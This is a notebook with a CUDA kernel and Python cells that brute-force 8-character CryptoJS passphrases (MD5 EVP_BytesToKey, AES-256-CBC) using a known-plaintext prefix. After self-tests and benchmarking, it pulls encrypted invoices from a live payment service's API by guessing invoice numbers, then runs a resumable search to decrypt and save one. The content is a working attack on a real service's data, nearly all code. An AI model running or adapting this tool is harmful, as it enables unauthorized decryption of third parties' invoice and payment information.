# EVP_BytesToKey GPU search — 8-char key space (61^8 = 191,707,312,997,281)

Searches CryptoJS/OpenSSL passphrase keys: `MD5` EVP_BytesToKey -> AES-256-CBC, first-block filter `{"desc":`.

**Setup: Runtime -> Change runtime type -> GPU, then Runtime -> Run all.**

Cells: env check -> write kernel -> compile -> selftest vs hashlib/OpenSSL -> benchmark -> fetch target -> main search (progress + checkpoint `ckpt.txt`; resumes with START from ckpt).

In [ ]:
!nvidia-smi || echo "NO GPU — set runtime type to GPU first (Runtime -> Change runtime type)" 

In [ ]:
%%writefile crack.cu
// crack.cu — search CryptoJS/OpenSSL passphrase keys: EVP_BytesToKey(MD5) + AES-256-CBC
// 8 chars from 61-char charset => 61^8 = 191707312997281 candidates
// Filter: decrypt first block, check plaintext prefix (default {"desc":)
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <cuda_runtime.h>

#define CS    61ULL
#define SPACE 191707312997281ULL   // 61^8
#define BATCH (1ULL << 27)         // 134217728 candidates per launch
#define THREADS 256

// per-target constants
__device__ __constant__ uint8_t d_salt[8];
__device__ __constant__ uint8_t d_C0[16];
__device__ __constant__ uint8_t d_expect[8];
__device__ __constant__ uint8_t d_pass[8];

__device__ uint8_t g_SBOX[256];
__device__ uint8_t g_ISBOX[256];

__device__ char d_CS[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";

#define CUDA_CHECK(x) do { cudaError_t e = (x); if (e != cudaSuccess) { \
  fprintf(stderr, "CUDA error: %s\n", cudaGetErrorString(e)); return 1; } } while (0)

// ---------------- MD5 ----------------
__device__ __forceinline__ uint32_t rotl32(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }

#define Ff(x,y,z) (((x) & (y)) | (~(x) & (z)))
#define Gg(x,y,z) (((x) & (z)) | ((y) & ~(z)))
#define Hh(x,y,z) ((x) ^ (y) ^ (z))
#define Ii(x,y,z) ((y) ^ ((x) | ~(z)))

// canonical MD5 step forms (RFC 1321): which var is written, and the outer addend
#define STEP1(f,x,s,t) a = b + rotl32(a + f(b,c,d) + (x) + (t), (s))
#define STEP2(f,x,s,t) d = a + rotl32(d + f(a,b,c) + (x) + (t), (s))
#define STEP3(f,x,s,t) c = d + rotl32(c + f(d,a,b) + (x) + (t), (s))
#define STEP4(f,x,s,t) b = c + rotl32(b + f(c,d,a) + (x) + (t), (s))

__device__ void md5_compress(const uint8_t p[64], uint32_t st[4]) {
  uint32_t M[16];
  for (int i = 0; i < 16; i++)
    M[i] = (uint32_t)p[4*i] | ((uint32_t)p[4*i+1] << 8) |
           ((uint32_t)p[4*i+2] << 16) | ((uint32_t)p[4*i+3] << 24);
  uint32_t a = st[0], b = st[1], c = st[2], d = st[3];

  // round 1: F, shifts 7,12,17,22
  STEP1(Ff, M[0],  7, 0xd76aa478);
  STEP2(Ff, M[1], 12, 0xe8c7b756);
  STEP3(Ff, M[2], 17, 0x242070db);
  STEP4(Ff, M[3], 22, 0xc1bdceee);
  STEP1(Ff, M[4],  7, 0xf57c0faf);
  STEP2(Ff, M[5], 12, 0x4787c62a);
  STEP3(Ff, M[6], 17, 0xa8304613);
  STEP4(Ff, M[7], 22, 0xfd469501);
  STEP1(Ff, M[8],  7, 0x698098d8);
  STEP2(Ff, M[9], 12, 0x8b44f7af);
  STEP3(Ff, M[10],17, 0xffff5bb1);
  STEP4(Ff, M[11],22, 0x895cd7be);
  STEP1(Ff, M[12], 7, 0x6b901122);
  STEP2(Ff, M[13],12, 0xfd987193);
  STEP3(Ff, M[14],17, 0xa679438e);
  STEP4(Ff, M[15],22, 0x49b40821);
  // round 2: G, shifts 5,9,14,20
  STEP1(Gg, M[1],  5, 0xf61e2562);
  STEP2(Gg, M[6],  9, 0xc040b340);
  STEP3(Gg, M[11],14, 0x265e5a51);
  STEP4(Gg, M[0], 20, 0xe9b6c7aa);
  STEP1(Gg, M[5],  5, 0xd62f105d);
  STEP2(Gg, M[10], 9, 0x02441453);
  STEP3(Gg, M[15],14, 0xd8a1e681);
  STEP4(Gg, M[4], 20, 0xe7d3fbc8);
  STEP1(Gg, M[9],  5, 0x21e1cde6);
  STEP2(Gg, M[14], 9, 0xc33707d6);
  STEP3(Gg, M[3], 14, 0xf4d50d87);
  STEP4(Gg, M[8], 20, 0x455a14ed);
  STEP1(Gg, M[13], 5, 0xa9e3e905);
  STEP2(Gg, M[2],  9, 0xfcefa3f8);
  STEP3(Gg, M[7], 14, 0x676f02d9);
  STEP4(Gg, M[12],20, 0x8d2a4c8a);
  // round 3: H, shifts 4,11,16,23
  STEP1(Hh, M[5],  4, 0xfffa3942);
  STEP2(Hh, M[8], 11, 0x8771f681);
  STEP3(Hh, M[11],16, 0x6d9d6122);
  STEP4(Hh, M[14],23, 0xfde5380c);
  STEP1(Hh, M[1],  4, 0xa4beea44);
  STEP2(Hh, M[4], 11, 0x4bdecfa9);
  STEP3(Hh, M[7], 16, 0xf6bb4b60);
  STEP4(Hh, M[10],23, 0xbebfbc70);
  STEP1(Hh, M[13], 4, 0x289b7ec6);
  STEP2(Hh, M[0], 11, 0xeaa127fa);
  STEP3(Hh, M[3], 16, 0xd4ef3085);
  STEP4(Hh, M[6], 23, 0x04881d05);
  STEP1(Hh, M[9],  4, 0xd9d4d039);
  STEP2(Hh, M[12],11, 0xe6db99e5);
  STEP3(Hh, M[15],16, 0x1fa27cf8);
  STEP4(Hh, M[2], 23, 0xc4ac5665);
  // round 4: I, shifts 6,10,15,21
  STEP1(Ii, M[0],  6, 0xf4292244);
  STEP2(Ii, M[7], 10, 0x432aff97);
  STEP3(Ii, M[14],15, 0xab9423a7);
  STEP4(Ii, M[5], 21, 0xfc93a039);
  STEP1(Ii, M[12], 6, 0x655b59c3);
  STEP2(Ii, M[3], 10, 0x8f0ccc92);
  STEP3(Ii, M[10],15, 0xffeff47d);
  STEP4(Ii, M[1], 21, 0x85845dd1);
  STEP1(Ii, M[8],  6, 0x6fa87e4f);
  STEP2(Ii, M[15],10, 0xfe2ce6e0);
  STEP3(Ii, M[6], 15, 0xa3014314);
  STEP4(Ii, M[13],21, 0x4e0811a1);
  STEP1(Ii, M[4],  6, 0xf7537e82);
  STEP2(Ii, M[11],10, 0xbd3af235);
  STEP3(Ii, M[2], 15, 0x2ad7d2bb);
  STEP4(Ii, M[9], 21, 0xeb86d391);

  st[0] += a; st[1] += b; st[2] += c; st[3] += d;
}

#undef STEP1
#undef STEP2
#undef STEP3
#undef STEP4
#undef Ff
#undef Gg
#undef Hh
#undef Ii

// ---------------- EVP_BytesToKey (MD5, OpenSSL legacy compatible) ----------------
// D1 = MD5(pass || salt)
// D2 = MD5(D1  || pass || salt)
// D3 = MD5(D2  || pass || salt)
// key = D1||D2 (32B), iv = D3 (16B)
__device__ void evp_kdf(const uint8_t pass[8], uint8_t key[32], uint8_t iv[16]) {
  uint8_t blk[64];
  uint32_t st[4];
  uint8_t prev[16];

  for (int round = 0; round < 3; round++) {
    for (int i = 0; i < 64; i++) blk[i] = 0;
    if (round == 0) {
      for (int i = 0; i < 8; i++) { blk[i] = pass[i]; blk[8 + i] = d_salt[i]; }
      blk[16] = 0x80;      // MD5 padding marker
      blk[56] = 0x80;      // bit length 128 = 0x80 (LE64 at offset 56)
    } else {
      for (int i = 0; i < 16; i++) blk[i] = prev[i];
      for (int i = 0; i < 8; i++) { blk[16 + i] = pass[i]; blk[24 + i] = d_salt[i]; }
      blk[32] = 0x80;      // padding marker
      blk[56] = 0x00; blk[57] = 0x01;   // bit length 256 = 0x100 (LE64)
    }
    st[0] = 0x67452301u; st[1] = 0xefcdab89u; st[2] = 0x98badcfeu; st[3] = 0x10325476u;
    md5_compress(blk, st);
    for (int i = 0; i < 4; i++) {
      prev[i*4+0] = (uint8_t)(st[i]);
      prev[i*4+1] = (uint8_t)(st[i] >> 8);
      prev[i*4+2] = (uint8_t)(st[i] >> 16);
      prev[i*4+3] = (uint8_t)(st[i] >> 24);
    }
    if (round == 0)      for (int i = 0; i < 16; i++) key[i] = prev[i];
    else if (round == 1) for (int i = 0; i < 16; i++) key[16 + i] = prev[i];
    else                 for (int i = 0; i < 16; i++) iv[i] = prev[i];
  }
}

// ---------------- AES-256 ----------------
__device__ void expand256(const uint8_t key[32], uint8_t rk[240]) {
  for (int i = 0; i < 32; i++) rk[i] = key[i];
  uint8_t rcon = 1;
  for (int i = 32; i < 240; i += 4) {
    uint8_t t0 = rk[i-4], t1 = rk[i-3], t2 = rk[i-2], t3 = rk[i-1];
    int w = i >> 2;
    if ((w & 7) == 0) {
      uint8_t tmp = t0;
      t0 = (uint8_t)(g_SBOX[t1] ^ rcon);
      t1 = g_SBOX[t2];
      t2 = g_SBOX[t3];
      t3 = g_SBOX[tmp];
      rcon = (uint8_t)((rcon << 1) ^ ((rcon & 0x80) ? 0x1b : 0));
    } else if ((w & 7) == 4) {
      t0 = g_SBOX[t0]; t1 = g_SBOX[t1]; t2 = g_SBOX[t2]; t3 = g_SBOX[t3];
    }
    rk[i+0] = (uint8_t)(rk[i-32+0] ^ t0);
    rk[i+1] = (uint8_t)(rk[i-32+1] ^ t1);
    rk[i+2] = (uint8_t)(rk[i-32+2] ^ t2);
    rk[i+3] = (uint8_t)(rk[i-32+3] ^ t3);
  }
}

__device__ void inv_shift_rows(uint8_t s[16]) {
  uint8_t t;
  t = s[13]; s[13] = s[9]; s[9] = s[5]; s[5] = s[1]; s[1] = t;   // row1 right 1
  t = s[2];  s[2] = s[10]; s[10] = t;                              // row2 right 2
  t = s[6];  s[6] = s[14]; s[14] = t;
  t = s[3];  s[3] = s[7]; s[7] = s[11]; s[11] = s[15]; s[15] = t; // row3 right 3
}

__device__ uint8_t gmul(uint8_t a, uint8_t b) {
  uint8_t p = 0;
  for (int i = 0; i < 8; i++) {
    if (b & 1) p ^= a;
    a = (uint8_t)((a << 1) ^ ((a & 0x80) ? 0x1b : 0));
    b >>= 1;
  }
  return p;
}

__device__ void inv_mix_columns(uint8_t s[16]) {
  for (int c = 0; c < 4; c++) {
    uint8_t *q = s + 4*c;
    uint8_t a0 = q[0], a1 = q[1], a2 = q[2], a3 = q[3];
    q[0] = (uint8_t)(gmul(a0,14) ^ gmul(a1,11) ^ gmul(a2,13) ^ gmul(a3,9));
    q[1] = (uint8_t)(gmul(a0,9)  ^ gmul(a1,14) ^ gmul(a2,11) ^ gmul(a3,13));
    q[2] = (uint8_t)(gmul(a0,13) ^ gmul(a1,9)  ^ gmul(a2,14) ^ gmul(a3,11));
    q[3] = (uint8_t)(gmul(a0,11) ^ gmul(a1,13) ^ gmul(a2,9)  ^ gmul(a3,14));
  }
}

// inverse cipher (FIPS-197 Fig. 11 order)
__device__ void aes256_decrypt_block(const uint8_t rk[240], const uint8_t in[16], uint8_t out[16]) {
  uint8_t s[16];
  for (int i = 0; i < 16; i++) s[i] = (uint8_t)(in[i] ^ rk[14*16 + i]);
  for (int r = 13; r >= 1; r--) {
    inv_shift_rows(s);
    for (int i = 0; i < 16; i++) s[i] = g_ISBOX[s[i]];
    for (int i = 0; i < 16; i++) s[i] ^= rk[r*16 + i];
    inv_mix_columns(s);
  }
  inv_shift_rows(s);
  for (int i = 0; i < 16; i++) s[i] = g_ISBOX[s[i]];
  for (int i = 0; i < 16; i++) s[i] ^= rk[i];
  for (int i = 0; i < 16; i++) out[i] = s[i];
}

// ---------------- kernels ----------------
__global__ void probe_kernel(uint8_t* out64) {
  uint8_t key[32], iv[16], rk[240], dec[16];
  evp_kdf(d_pass, key, iv);
  expand256(key, rk);
  aes256_decrypt_block(rk, d_C0, dec);
  for (int i = 0; i < 16; i++) out64[i]      = key[i];
  for (int i = 0; i < 16; i++) out64[16 + i] = key[16 + i];
  for (int i = 0; i < 16; i++) out64[32 + i] = iv[i];
  for (int i = 0; i < 16; i++) out64[48 + i] = (uint8_t)(dec[i] ^ iv[i]);  // P0
}

__global__ void find_kernel(uint64_t start, uint64_t count, int* d_flag,
                            uint64_t* d_pos, uint8_t* d_key) {
  uint64_t idx = start + (uint64_t)blockIdx.x * (uint64_t)blockDim.x + threadIdx.x;
  if (idx >= start + count) return;
  if (*d_flag >= 0) return;

  uint8_t pass[8];
  uint64_t t = idx;
  #pragma unroll
  for (int j = 7; j >= 0; j--) { pass[j] = (uint8_t)d_CS[t % CS]; t /= CS; }

  uint8_t key[32], iv[16], rk[240], dec[16];
  evp_kdf(pass, key, iv);
  expand256(key, rk);
  aes256_decrypt_block(rk, d_C0, dec);

  // P0[i] = dec[i] ^ iv[i]; check first 8 bytes against expected prefix
  bool ok = true;
  #pragma unroll
  for (int i = 0; i < 8; i++)
    if ((uint8_t)(dec[i] ^ iv[i]) != d_expect[i]) { ok = false; break; }

  if (count <= 256) {   // debug trace for tiny spans (selftest)
    char pb[9];
    for (int i = 0; i < 8; i++) pb[i] = (char)pass[i];
    pb[8] = 0;
    printf("DBG idx=%llu pass=%s passhex=", (unsigned long long)idx, pb);
    for (int i = 0; i < 8; i++) printf("%02x", pass[i]);
    printf(" P0=");
    for (int i = 0; i < 8; i++) printf("%02x", (uint8_t)(dec[i] ^ iv[i]));
    printf(" exp=");
    for (int i = 0; i < 8; i++) printf("%02x", d_expect[i]);
    printf(" cs0=%d cs35=%d ok=%d\n",
           (int)d_CS[0], (int)d_CS[35], (int)ok);
  }

  if (ok) {
    if (atomicCAS(d_flag, -1, 0) == -1) {
      *d_pos = idx;
      for (int i = 0; i < 8; i++) d_key[i] = pass[i];
    }
  }
}

// ---------------- host helpers ----------------
static int hex2bin(const char* hx, uint8_t* out, int maxlen) {
  int n = (int)strlen(hx);
  if (n % 2 || n / 2 > maxlen) return -1;
  for (int i = 0; i < n / 2; i++) {
    unsigned v;
    if (sscanf(hx + 2*i, "%2x", &v) != 1) return -1;
    out[i] = (uint8_t)v;
  }
  return n / 2;
}

static uint8_t hmul(uint8_t a, uint8_t b) {
  uint8_t p = 0;
  while (b) { if (b & 1) p ^= a; a = (uint8_t)((a << 1) ^ ((a & 0x80) ? 0x1b : 0)); b >>= 1; }
  return p;
}
static uint8_t hpow(uint8_t a, int e) { uint8_t r = 1; while (e) { if (e & 1) r = hmul(r, a); a = hmul(a, a); e >>= 1; } return r; }
static uint8_t hrotl(uint8_t x, int n) { return (uint8_t)((x << n) | (x >> (8 - n))); }

static int build_sboxes() {
  static uint8_t S[256], I[256];
  for (int i = 0; i < 256; i++) {
    uint8_t inv = i ? hpow((uint8_t)i, 254) : 0;
    uint8_t s = (uint8_t)(inv ^ hrotl(inv,1) ^ hrotl(inv,2) ^ hrotl(inv,3) ^ hrotl(inv,4) ^ 0x63);
    S[i] = s;
  }
  for (int i = 0; i < 256; i++) I[S[i]] = (uint8_t)i;
  cudaError_t e1 = cudaMemcpyToSymbol(g_SBOX, S, 256);
  cudaError_t e2 = cudaMemcpyToSymbol(g_ISBOX, I, 256);
  if (e1 != cudaSuccess || e2 != cudaSuccess) {
    fprintf(stderr, "sbox upload failed: %s\n", cudaGetErrorString(e1 != cudaSuccess ? e1 : e2));
    return 1;
  }
  return 0;
}

int main(int argc, char** argv) {
  if (argc < 2) {
    fprintf(stderr,
      "usage:\n"
      "  crack probe <pass8> <salthex16> <c0hex32>\n"
      "  crack find  <salthex16> <c0hex32> <start> <count> [prefixhex]\n"
      "     count=0 means search to end of space\n");
    return 2;
  }
  if (build_sboxes() != 0) return 1;

  if (!strcmp(argv[1], "probe")) {
    if (argc < 5) { fprintf(stderr, "probe needs pass salt c0\n"); return 2; }
    uint8_t salt[8], c0[16], pass[8];
    if ((int)strlen(argv[2]) != 8) { fprintf(stderr, "pass must be 8 chars\n"); return 2; }
    memcpy(pass, argv[2], 8);
    if (hex2bin(argv[3], salt, 8) != 8) { fprintf(stderr, "bad salt hex\n"); return 2; }
    if (hex2bin(argv[4], c0, 16) != 16) { fprintf(stderr, "bad c0 hex\n"); return 2; }
    CUDA_CHECK(cudaMemcpyToSymbol(d_salt, salt, 8));
    CUDA_CHECK(cudaMemcpyToSymbol(d_C0, c0, 16));
    CUDA_CHECK(cudaMemcpyToSymbol(d_pass, pass, 8));
    uint8_t* out;
    CUDA_CHECK(cudaMalloc(&out, 64));
    probe_kernel<<<1, 1>>>(out);
    CUDA_CHECK(cudaGetLastError());
    CUDA_CHECK(cudaDeviceSynchronize());
    uint8_t h[64];
    CUDA_CHECK(cudaMemcpy(h, out, 64, cudaMemcpyDeviceToHost));
    CUDA_CHECK(cudaFree(out));
    char hex[33];
    const char* lbl[] = {"D1", "D2", "D3", "P0"};
    for (int off = 0; off < 64; off += 16) {
      for (int i = 0; i < 16; i++) sprintf(hex + 2*i, "%02x", h[off + i]);
      printf("%s %s\n", lbl[off / 16], hex);
    }
    fflush(stdout);
    return 0;
  }

  if (!strcmp(argv[1], "find")) {
    if (argc < 6) { fprintf(stderr, "find needs salt c0 start count\n"); return 2; }
    uint8_t salt[8], c0[16];
    if (hex2bin(argv[2], salt, 8) != 8) { fprintf(stderr, "bad salt hex\n"); return 2; }
    if (hex2bin(argv[3], c0, 16) != 16) { fprintf(stderr, "bad c0 hex\n"); return 2; }
    uint64_t start = strtoull(argv[4], NULL, 10);
    uint64_t count = strtoull(argv[5], NULL, 10);
    uint8_t expect[8] = {0x7b, 0x22, 0x64, 0x65, 0x73, 0x63, 0x3a, 0x22}; // {"desc":
    if (argc >= 7) {
      if (hex2bin(argv[6], expect, 8) != 8) { fprintf(stderr, "bad prefix hex\n"); return 2; }
    }
    CUDA_CHECK(cudaMemcpyToSymbol(d_salt, salt, 8));
    CUDA_CHECK(cudaMemcpyToSymbol(d_C0, c0, 16));
    CUDA_CHECK(cudaMemcpyToSymbol(d_expect, expect, 8));

    cudaDeviceProp prop;
    CUDA_CHECK(cudaGetDeviceProperties(&prop, 0));
    printf("GPU %s sm_%d%d\n", prop.name, prop.major, prop.minor);

    if (start >= SPACE) { fprintf(stderr, "start beyond space\n"); return 2; }
    uint64_t end = (count == 0) ? SPACE : start + count;
    if (end > SPACE) end = SPACE;
    if (end <= start) { fprintf(stderr, "empty range\n"); return 2; }
    printf("RANGE start=%llu end=%llu span=%llu\n",
           (unsigned long long)start, (unsigned long long)end,
           (unsigned long long)(end - start));
    fflush(stdout);

    int* d_flag;
    uint64_t* d_pos;
    uint8_t* d_key;
    CUDA_CHECK(cudaMalloc(&d_flag, 4));
    CUDA_CHECK(cudaMalloc(&d_pos, 8));
    CUDA_CHECK(cudaMalloc(&d_key, 8));
    int minus1 = -1;
    CUDA_CHECK(cudaMemcpy(d_flag, &minus1, 4, cudaMemcpyHostToDevice));

    auto t0 = std::chrono::steady_clock::now();
    auto last_report = t0;
    auto last_ckpt = t0;
    uint64_t pos = start;
    uint64_t done = 0;
    int found = 0;
    uint64_t found_pos = 0;
    uint8_t found_key[8] = {0};

    while (pos < end) {
      uint64_t batch = end - pos;
      if (batch > BATCH) batch = BATCH;
      int blocks = (int)((batch + THREADS - 1) / THREADS);
      find_kernel<<<blocks, THREADS>>>(pos, batch, d_flag, d_pos, d_key);
      cudaError_t ke = cudaGetLastError();
      if (ke != cudaSuccess) { fprintf(stderr, "launch: %s\n", cudaGetErrorString(ke)); return 1; }
      CUDA_CHECK(cudaDeviceSynchronize());
      int flag = -1;
      CUDA_CHECK(cudaMemcpy(&flag, d_flag, 4, cudaMemcpyDeviceToHost));
      pos += batch;
      done += batch;
      if (flag >= 0) {
        CUDA_CHECK(cudaMemcpy(&found_pos, d_pos, 8, cudaMemcpyDeviceToHost));
        CUDA_CHECK(cudaMemcpy(found_key, d_key, 8, cudaMemcpyDeviceToHost));
        found = 1;
      }
      auto now = std::chrono::steady_clock::now();
      double el = std::chrono::duration<double>(now - last_report).count();
      if (found || el >= 2.0) {
        double tot = std::chrono::duration<double>(now - t0).count();
        double rate = (tot > 0) ? (double)done / tot : 0;
        double pct = 100.0 * (double)(pos - start) / (double)(end - start);
        double eta_h = (rate > 0) ? (double)(end - pos) / rate / 3600.0 : -1;
        printf("PROG pos=%llu pct=%.4f rate=%.0f eta_h=%.1f\n",
               (unsigned long long)pos, pct, rate, eta_h);
        fflush(stdout);
        last_report = now;
      }
      if (!found) {
        double elc = std::chrono::duration<double>(now - last_ckpt).count();
        if (elc >= 30.0) {
          FILE* f = fopen("crack.ckpt", "w");
          if (f) { fprintf(f, "%llu\n", (unsigned long long)pos); fclose(f); }
          last_ckpt = now;
        }
      }
      if (found) break;
    }

    if (found) {
      char kbuf[9];
      for (int i = 0; i < 8; i++) kbuf[i] = (char)found_key[i];
      kbuf[8] = 0;
      printf("FOUND %s %llu\n", kbuf, (unsigned long long)found_pos);
    } else {
      printf("DONE no-find pos=%llu\n", (unsigned long long)pos);
      FILE* f = fopen("crack.ckpt", "w");
      if (f) { fprintf(f, "%llu\n", (unsigned long long)pos); fclose(f); }
    }
    fflush(stdout);
    return found ? 0 : 3;
  }

  fprintf(stderr, "unknown mode %s\n", argv[1]);
  return 2;
}


In [ ]:
import subprocess
r = subprocess.run(["nvcc", "-O3", "-o", "crack", "crack.cu"])
if r.returncode != 0:
    print("retry with -arch=sm_75")
    r = subprocess.run(["nvcc", "-O3", "-arch=sm_75", "-o", "crack", "crack.cu"])
assert r.returncode == 0, "nvcc failed"
print("BUILD_OK")

In [ ]:
import hashlib, base64, subprocess, json, sys

CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz"
assert len(CHARSET) == 61, len(CHARSET)

def evp(passw, salt, n=48):
    D = b""; prev = b""
    while len(D) < n:
        prev = hashlib.md5(prev + passw + salt).digest()
        D += prev
    return D[:n]

def pos_of(k):
    t = 0
    for ch in k:
        t = t * 61 + CHARSET.index(ch)
    return t

# ---- synthetic test blob with known key 0000000Z (CryptoJS-compatible) ----
pt = json.dumps({"desc": "GPU selftest invoice", "timestamp": 1791400000,
                 "attach_name": None, "attach_data": None,
                 "addr": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
                 "amount": 12.5, "currency": "USD", "expiry": 86400}).encode()
salt_t = bytes.fromhex("0102030405060708")
K = b"0000000Z"
D = evp(K, salt_t)
padn = 16 - len(pt) % 16
ptp = pt + bytes([padn] * padn)
p = subprocess.run(["openssl", "enc", "-aes-256-cbc", "-K", D[:32].hex(),
                    "-iv", D[32:].hex()], input=ptp, capture_output=True)
assert p.returncode == 0, p.stderr
ct_t = p.stdout
open("test.b64", "w").write(base64.b64encode(b"Salted__" + salt_t + ct_t).decode())
print("test blob ready; key position should be", pos_of("0000000Z"))

c0_hex = ct_t[:16].hex()
salt_hex = salt_t.hex()

# ---- GPU probe vs hashlib+openssl reference (uses a different key) ----
K2 = "K7pQm2Xz"
r = subprocess.run(["./crack", "probe", K2, salt_hex, c0_hex],
                   capture_output=True, text=True)
assert r.returncode == 0, r.stderr
got = dict(l.split() for l in r.stdout.strip().splitlines())
D2 = evp(K2.encode(), salt_t)
pr = subprocess.run(["openssl", "enc", "-d", "-aes-256-cbc", "-K", D2[:32].hex(),
                     "-iv", D2[32:].hex(), "-nopad"], input=ct_t, capture_output=True)
ref = {"D1": D2[:16].hex(), "D2": D2[16:32].hex(), "D3": D2[32:].hex(),
       "P0": pr.stdout[:16].hex()}
for k in ("D1", "D2", "D3", "P0"):
    assert got.get(k) == ref[k], (k, got.get(k), ref[k])
print("PROBE PASS — GPU KDF+AES matches hashlib+openssl byte for byte")

# ---- end to end: enumeration + filter must find 0000000Z at position 35 ----
r = subprocess.run(["./crack", "find", salt_hex, c0_hex, "0", "128"],
                   capture_output=True, text=True)
print(r.stdout.strip())
assert "FOUND 0000000Z 35" in r.stdout, r.stdout
print("E2E PASS — enumeration + prefix filter correct")

In [ ]:
import re, subprocess
r = subprocess.run(["./crack", "find", salt_hex, c0_hex, "1000", "5000000000"],
                    capture_output=True, text=True)
print(r.stdout.strip())
m = re.findall(r"rate=(\d+)", r.stdout)
assert m, "no rate line"
rate = int(m[-1])
SPACE = 191707312997281
print(f"\nRATE {rate:,} keys/sec")
print(f"full space: {SPACE/rate/3600:.1f} h worst case, {SPACE/rate/7200:.1f} h average")

In [ ]:
import requests, base64
cand = [28980, 28500, 28550, 14000, 13300, 13277, 20000, 30000, 50000]
target, tnum = None, None
for n in cand:
    try:
        rr = requests.get(f"https://www.blockonomics.co/api/invoice?number={n}",
                          timeout=15, headers={"User-Agent": "Mozilla/5.0"})
        j = rr.json()
        c = j.get("content") if isinstance(j, dict) else None
        if isinstance(c, str) and c.startswith("U2FsdGVkX1"):
            target, tnum = c, n
            print("invoice", n, "OK ctlen", len(c))
            break
        print(n, "->", str(j)[:70])
    except Exception as e:
        print(n, "err", e)
assert target, "no invoice found"
open("target.b64", "w").write(target)
raw = base64.b64decode(target)
t_salt, t_c0 = raw[8:16], raw[16:32]
print("TARGET invoice", tnum, "salt", t_salt.hex(), "c0", t_c0.hex())

In [ ]:
import subprocess, base64, re, os

SPACE = 191707312997281
START = 0
if os.path.exists("ckpt.txt"):
    v = open("ckpt.txt").read().strip()
    if v:
        START = int(v)
    print("resuming from", START)

proc = subprocess.Popen(["./crack", "find", t_salt.hex(), t_c0.hex(), str(START), "0"],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, bufsize=1)
found_key, found_pos = None, None
for line in proc.stdout:
    line = line.rstrip()
    print(line, flush=True)
    if line.startswith("PROG"):
        m = re.search(r"pos=(\d+)", line)
        if m:
            open("ckpt.txt", "w").write(m.group(1))
    if line.startswith("FOUND"):
        parts = line.split()
        found_key, found_pos = parts[1], parts[2]
        break
try:
    proc.terminate()
except Exception:
    pass

if found_key:
    raw = base64.b64decode(open("target.b64").read().strip())
    salt, ct = raw[8:16], raw[16:]
    D = evp(found_key.encode(), salt, 48)
    pr = subprocess.run(["openssl", "enc", "-d", "-aes-256-cbc", "-K", D[:32].hex(),
                         "-iv", D[32:].hex()], input=ct, capture_output=True)
    pt = pr.stdout
    pt = pt[:-pt[-1]]
    print("\n============ KEY", found_key, "at position", found_pos, "============")
    print("PLAINTEXT:")
    print(pt.decode("utf-8", "replace"))
    open("found.json", "wb").write(pt)
else:
    ck = open("ckpt.txt").read().strip() if os.path.exists("ckpt.txt") else str(START)
    print("stopped, checkpoint:", ck, "— rerun this cell to resume")